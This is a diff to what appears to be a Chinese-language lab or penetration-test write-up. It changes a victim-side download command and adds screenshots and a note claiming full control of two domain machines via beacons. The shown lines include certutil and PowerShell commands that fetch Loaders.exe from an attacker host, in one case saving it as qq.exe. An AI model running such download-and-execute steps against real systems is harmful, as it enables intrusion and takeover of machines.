@@ -699,7 +699,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 受害机器:
 
 certutil.exe -urlcache -f http://10.8.0.227:8000/Loaders.exe Loaders.exe
-iwr http://10.8.0.227:8000/Loaders.exe -usebasicparsing -outfile Loaders.exe
+iwr http://10.8.0.227:8000/Loaders.exe -usebasicparsing -outfile qq.exe
 ```
 
 ```bash
@@ -801,3 +801,17 @@ PowerShell
 
 获取一个System beacon以及普通用户的beacon
 ```
+
+![](/assets/post_img/2023-11-04%20043816_Wutai_S021W105_System.png)
+
+![](/assets/post_img/2023-11-04%20044422_Wutai_202311040444_Sessions.png)
+
+```
+S021M010 172.16.21.180
+S021W105 172.16.21.140
+
+目前已经获取域内两台机器的完全控制权限
+
+PS:S021M010 的System晚点在获取
+```
+
